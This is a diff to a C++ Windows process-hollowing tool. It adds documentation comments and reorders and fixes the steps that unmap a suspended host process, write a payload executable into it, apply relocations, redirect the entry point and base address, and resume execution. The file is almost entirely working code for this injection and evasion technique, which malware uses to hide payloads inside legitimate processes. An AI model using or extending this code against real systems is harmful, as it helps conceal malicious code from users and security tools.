@@ -12,6 +12,11 @@ Hollowing::Hollowing(const std::string& hostPath, const std::string& payloadPath
 {
 }
 
+/*
+ * This method preform the process hollowing technique with the host process and the target executable
+ * Input: None
+ * Output: None
+*/
 void Hollowing::hollow() const
 {
 	PROCESS_INFORMATION procInfo = { INVALID_HANDLE_VALUE, INVALID_HANDLE_VALUE };
@@ -56,11 +61,11 @@ void Hollowing::hollow() const
 		updateProcEntryPoint(procInfo, piNtHeaders, hostBaseAddr);
 		std::cout << "[+] Host's entry point updated to payload's entry point: 0x" << std::hex << reinterpret_cast<DWORD>(hostBaseAddr) + piNtHeaders->OptionalHeader.AddressOfEntryPoint << std::endl;
 
-		updateProcBaseImageAddr(procInfo, piNtHeaders, hostBaseAddr);
-		std::cout << "[+] Host's base image address updated to payload's base image address: 0x" << std::hex << hostBaseAddr << std::endl;
-
 		relocateHostProc(procInfo, piNtHeaders, piRelocHeader, hostBaseAddr, payloadImage, baseImageDelta);
 		std::cout << "[+] Host process relocated" << std::endl;
+
+		updateProcBaseImageAddr(procInfo, hostBaseAddr);
+		std::cout << "[+] Host's base image address updated to payload's base image address: 0x" << std::hex << hostBaseAddr << std::endl;
 
 		resumeHost(procInfo);
 		std::cout << "[+] Host's thread resume" << std::endl;
@@ -84,6 +89,12 @@ void Hollowing::hollow() const
 		CloseHandle(procInfo.hProcess);
 }
 
+/*
+ * This method validate that the host and the payload binaries are PE32
+ * Input: None
+ * Output: None
+ * Throws: (CompatibilityException) -> When the binaries not PE32
+*/
 void Hollowing::validateBinaries() const
 {
 	DWORD hostBinType = 0;
@@ -98,6 +109,13 @@ void Hollowing::validateBinaries() const
 
 }
 
+/*
+ * This method load the functions that aren't in windows.h from ntdll.dll
+   (only the relevant)
+ * Input: None
+ * Output: None
+ * Throws: (ImportException) -> When ntdll.dll aren't reachable
+*/
 void Hollowing::loadNativeApiFuncs() const
 {
 	LPVOID funcAddr = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtUnmapViewOfSection");
@@ -108,24 +126,40 @@ void Hollowing::loadNativeApiFuncs() const
 	NtUnmapViewOfSection = reinterpret_cast<pdef_NtUnmapViewOfSection>(funcAddr);
 }
 
+/*
+ * This method create the host process (as suspended)
+ * Input: None
+ * Output: (PROCESS_INFORMATION) -> An struct the represent the handles and ids for the thread and process of the host
+ * Throws: (CreationFailedException) -> When process creation failed
+*/
 PROCESS_INFORMATION Hollowing::createHostSuspended() const
 {
 	STARTUPINFOA startupInfo = { sizeof(STARTUPINFOA) };
 	PROCESS_INFORMATION procInfo = { INVALID_HANDLE_VALUE, INVALID_HANDLE_VALUE };
 
-	if (!CreateProcessA(m_hostPath.c_str(), nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, nullptr, nullptr, &startupInfo, &procInfo))
+	if (!CreateProcessA(m_hostPath.c_str(), nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED | CREATE_NEW_PROCESS_GROUP | CREATE_NEW_CONSOLE, nullptr, nullptr, &startupInfo, &procInfo))
 		throw CreationFailedException("[-] Failed to create suspended process for the host");
 
 	return procInfo;
 }
 
+/*
+ * This method loads the executable content of the payload into an buffer
+ * Input: None
+ * Output: (LPVOID) -> An 'VirtualAlloc' buffer contains the file content of the payload executable
+ * Throws: (CreationFailedException) -> When the file can't be accessed
+   (FileSizeException) -> When the file size is larger than 2 ^ 32
+   (AllocationException) -> When the allocation went wrong
+   (ReadingException) -> When the file reading went wrong
+ * Allocations: The buffer allocated with 'VirtualAlloc' remember to use 'VirtualFree' at the end!
+*/
 LPVOID Hollowing::getPayloadImage() const
 {
 	HANDLE fileHandle = CreateFileA(m_payloadPath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
 
 	if (fileHandle == INVALID_HANDLE_VALUE)
 		throw CreationFailedException("[-] Failed opening the payload file");
-	
+
 	DWORD fileSizeH = 0;
 	DWORD fileSizeL = GetFileSize(fileHandle, &fileSizeH);
 
@@ -154,6 +188,12 @@ LPVOID Hollowing::getPayloadImage() const
 	return img;
 }
 
+/*
+ * This method extract the Nt Header from an given executable image
+ * Input: (const LPVOID) image -> the executable image
+ * Output: (PIMAGE_NT_HEADERS) -> pointer from the image that represent the NT headers
+ * Throws: (CompatibilityException) -> When the executable image aren't PE32
+*/
 PIMAGE_NT_HEADERS Hollowing::getNtHeadersFromImage(const LPVOID image) const
 {
 	PIMAGE_DOS_HEADER piDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(image);
@@ -165,6 +205,13 @@ PIMAGE_NT_HEADERS Hollowing::getNtHeadersFromImage(const LPVOID image) const
 	return piNtHeaders;
 }
 
+/*
+ * This method extract the process base image from the given 'procInfo'
+ * Input: (const PROCESS_INFORMATION&) procInfo -> An 'PROCESS_INFORMATION' struct that represents the desired process
+ * Output: (LPVOID) -> pointer that represent the base image address
+ * Throws: (ProccessAccessException) -> When accessing host thread context failed
+   (ReadingException) -> When reading the base image from host process failed
+*/
 LPVOID Hollowing::getProcBaseImageAddr(const PROCESS_INFORMATION& procInfo) const
 {
 	CONTEXT ctx = { 0 };
@@ -183,13 +230,28 @@ LPVOID Hollowing::getProcBaseImageAddr(const PROCESS_INFORMATION& procInfo) cons
 	return baseImg;
 }
 
+/*
+ * This method hollow the the process sections
+ * Input: (const PROCESS_INFORMATION&) procInfo -> An 'PROCESS_INFORMATION' struct that represents the desired process
+   (const LPVOID) baseImg -> the base image of the process
+ * Output: None
+ * Throws: (ProccessAccessException) -> When hollowing failed
+*/
 void Hollowing::hollowProcMemory(const PROCESS_INFORMATION& procInfo, const LPVOID baseImg) const
 {
 	if (NT_ERROR(NtUnmapViewOfSection(procInfo.hProcess, baseImg)))
 		throw ProccessAccessException("[-] Failed hollowing the host process memory");
 }
 
-void Hollowing::updateProcBaseImageAddr(const PROCESS_INFORMATION& procInfo, const PIMAGE_NT_HEADERS piNtHeaders, const PVOID hostBaseAddr) const
+/*
+ * This method updates the process base image address
+ * Input: (const PROCESS_INFORMATION&) procInfo -> An 'PROCESS_INFORMATION' struct that represents the desired process
+   (const LPVOID) baseImg -> new base image of the process
+ * Output: None
+ * Throws: (ProccessAccessException) -> When accessing host thread context failed
+   (WritingException) -> When writing the new base image into the host process failed
+*/
+void Hollowing::updateProcBaseImageAddr(const PROCESS_INFORMATION& procInfo, const PVOID hostBaseAddr) const
 {
 	CONTEXT ctx = { 0 };
 	ctx.ContextFlags = CONTEXT_INTEGER;
@@ -201,6 +263,16 @@ void Hollowing::updateProcBaseImageAddr(const PROCESS_INFORMATION& procInfo, con
 		throw WritingException("[-] Failed writing the new base image into the host process");
 }
 
+/*
+ * This method rebind the process headers by the given NT Headers and the image
+ * Input: (const PROCESS_INFORMATION&) procInfo -> An 'PROCESS_INFORMATION' struct that represents the desired process
+   (const PIMAGE_NT_HEADERS) piNtHeaders -> the desired nt headers
+   (const PVOID) hostBaseAddr -> The base address of the host
+   (const LPVOID) image -> Buffer contains the image of the target executable
+ * Output: (PVOID) -> The new base address of the host process
+ * Throws: (AllocationException) -> When memory allocating inside the host process failed
+   (WritingException) -> When writing the new headers into the host process failed
+*/
 PVOID Hollowing::rebindProcHeaders(const PROCESS_INFORMATION& procInfo, const PIMAGE_NT_HEADERS piNtHeaders, const PVOID hostBaseAddr, const LPVOID image) const
 {
 	PVOID headersBase = VirtualAllocEx(procInfo.hProcess, reinterpret_cast<PVOID>(hostBaseAddr),
@@ -220,6 +292,14 @@ PVOID Hollowing::rebindProcHeaders(const PROCESS_INFORMATION& procInfo, const PI
 	return headersBase;
 }
 
+/*
+ * This method updates the entry point of the host process
+ * Input: (const PROCESS_INFORMATION&) procInfo -> An 'PROCESS_INFORMATION' struct that represents the desired process
+   (const PIMAGE_NT_HEADERS) piNtHeaders -> the desired nt headers
+   (const PVOID) hostBaseAddr -> The base address of the host
+ * Output: None
+ * Throws: (ProccessAccessException) -> When accessing / setting the host thread context failed
+*/
 void Hollowing::updateProcEntryPoint(const PROCESS_INFORMATION& procInfo, const PIMAGE_NT_HEADERS piNtHeaders, const PVOID hostBaseAddr) const
 {
 	CONTEXT ctx = { 0 };
@@ -236,6 +316,15 @@ void Hollowing::updateProcEntryPoint(const PROCESS_INFORMATION& procInfo, const 
 		throw ProccessAccessException("[-] Failed setting host thread context");
 }
 
+/*
+ * This method rebind the process sections by the given NT Headers and the image
+ * Input: (const PROCESS_INFORMATION&) procInfo -> An 'PROCESS_INFORMATION' struct that represents the desired process
+   (const PIMAGE_NT_HEADERS) piNtHeaders -> the desired nt headers
+   (const PVOID) hostBaseAddr -> The base address of the host
+   (const LPVOID) image -> Buffer contains the image of the target executable
+ * Output: (PVOID) -> The new base address of the host process
+ * Throws: (WritingException) -> When writing sections into the host process failed
+*/
 PIMAGE_SECTION_HEADER Hollowing::rebindProcSections(const PROCESS_INFORMATION& procInfo, const PIMAGE_NT_HEADERS piNtHeaders, const PVOID hostBaseAddr, const LPVOID image) const
 {
 	PIMAGE_SECTION_HEADER piSectionHeader = nullptr;
@@ -258,6 +347,18 @@ PIMAGE_SECTION_HEADER Hollowing::rebindProcSections(const PROCESS_INFORMATION& p
 	return piRelocSection;
 }
 
+/*
+ * This method fix the address aka relocating the host process
+ * Input: (const PROCESS_INFORMATION&) procInfo -> An 'PROCESS_INFORMATION' struct that represents the desired process
+   (const PIMAGE_NT_HEADERS) piNtHeaders -> the desired nt headers
+   (const PIMAGE_SECTION_HEADER) piRelocSection -> The reloc section
+   (const PVOID) hostBaseAddr -> The base address of the host
+   (const LPVOID) image -> Buffer contains the image of the target executable
+   (const DWORD) baseAddrDelta -> The delta between the host and target base address
+ * Output: None
+ * Throws: (ReadingException) -> When read the address from the host process failed
+   (WritingException) -> WHen writing the address to the host process failed 
+*/
 void Hollowing::relocateHostProc(const PROCESS_INFORMATION& procInfo, const PIMAGE_NT_HEADERS piNtHeaders, const PIMAGE_SECTION_HEADER piRelocSection, const PVOID hostBaseAddr, const PVOID image, const DWORD baseAddrDelta) const
 {
 	PIMAGE_DATA_DIRECTORY relocData = &piNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
@@ -275,15 +376,15 @@ void Hollowing::relocateHostProc(const PROCESS_INFORMATION& procInfo, const PIMA
 			// The base relocation is used to pad the block.
 			if (blockEntries[i].Type != IMAGE_REL_BASED_ABSOLUTE)
 			{
-				DWORD fieldAddr = reinterpret_cast<DWORD>(hostBaseAddr) + pRelocBlockHeader->PageAddress + blockEntries[i].Offset;
-				DWORD addressToFix = 0;
+				PBYTE fieldAddr = reinterpret_cast<PBYTE>(hostBaseAddr) + pRelocBlockHeader->PageAddress + blockEntries[i].Offset;
+				PBYTE addressToFix = 0;
 
-				if (!ReadProcessMemory(procInfo.hProcess, reinterpret_cast<LPVOID>(fieldAddr), &addressToFix, sizeof(addressToFix), nullptr))
+				if (!ReadProcessMemory(procInfo.hProcess, fieldAddr, &addressToFix, sizeof(addressToFix), nullptr))
 					throw ReadingException("[-] Can't retrive reloc address from the host");
 
 				addressToFix += baseAddrDelta;
 
-				if (!WriteProcessMemory(procInfo.hProcess, reinterpret_cast<LPVOID>(fieldAddr), &addressToFix, sizeof(addressToFix), nullptr))
+				if (!WriteProcessMemory(procInfo.hProcess, fieldAddr, &addressToFix, sizeof(addressToFix), nullptr))
 					throw WritingException("[-] Failed fixing reloc address on the host");
 			}
 		}
@@ -292,6 +393,12 @@ void Hollowing::relocateHostProc(const PROCESS_INFORMATION& procInfo, const PIMA
 	}
 }
 
+/*
+ * This method resume the process's thread
+ * Input: (const PROCESS_INFORMATION&) procInfo -> An 'PROCESS_INFORMATION' struct that represents the desired process
+ * Output: None
+ * Throws: (ProccessAccessException) -> When the resume operation failed
+*/
 void Hollowing::resumeHost(const PROCESS_INFORMATION& procInfo) const
 {
 	if (ResumeThread(procInfo.hThread) == -1)
